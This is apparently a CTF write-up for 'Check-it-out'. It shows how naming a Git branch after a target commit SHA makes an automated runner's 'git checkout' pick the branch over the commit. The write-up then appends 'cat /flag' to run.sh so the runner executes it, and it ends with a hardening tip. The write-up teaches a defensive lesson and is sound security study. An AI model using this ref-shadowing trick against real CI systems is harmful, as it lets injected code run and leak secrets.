---
title: "Check-it-out"
date: 2025-06-22
description: Exploiting Git command precedence where branch names take priority over commit hashes to hijack automated script checkout and execute commands.
challenge_author: "Not specified"
writeup_author: "sleepyswords & wallsdeep13"
---

**Challenge:** Check-it-out

**Goal:** Upload a Git bundle to an automated runner that checks out a designated commit and executes `run.sh`, forcing it to print `/flag`.

**Flag:**
- `GPNCTF{...}` - printed to execution logs upon running modified `run.sh`

---

## Vulnerability

The remote evaluation environment accepts a user-provided Git bundle and is designed to test a specific historical commit by executing:

```bash
git checkout 36a168b7942eedf14b33912db25357cb254457e9
./run.sh
```

The underlying vulnerability stems from how the `git checkout` command handles ambiguous references. In Git, when a string could match both a branch name and a commit SHA-1 hash, **branch names take priority over commit hashes**.

If a repository contains a local branch named literally `36a168b7942eedf14b33912db25357cb254457e9`, `git checkout 36a168b7942eedf14b33912db25357cb254457e9` will check out the head of that named branch rather than the historical commit hash with that SHA.

## Attack Path

### 1. Create a Branch Named After the Commit Hash

In the local Git repository, create and switch to a new branch whose name is identical to the target commit SHA:

```bash
git switch -c 36a168b7942eedf14b33912db25357cb254457e9
```

### 2. Modify the Execution Script

Edit `run.sh` on this branch to append a command that dumps the flag:

```bash
echo "cat /flag" >> run.sh
git add run.sh
git commit -m "update run script"
```

### 3. Package the Repository into a Bundle

Export all references in the repository into a standalone Git bundle file:

```bash
git bundle create test.bundle --all
```

### 4. Upload and Execute

Upload `test.bundle` to the challenge web interface. When the backend script executes `git checkout 36a168b7942eedf14b33912db25357cb254457e9`, Git switches to our custom branch instead of the clean commit. The runner then executes `./run.sh`, revealing the flag in the output stream.

---

## Notes

- Modern Git practices recommend using `git switch --detach <commit>` or explicit reference prefixes (`refs/tags/`, `refs/heads/`) rather than overloaded commands like `git checkout` when operating in automated scripts.
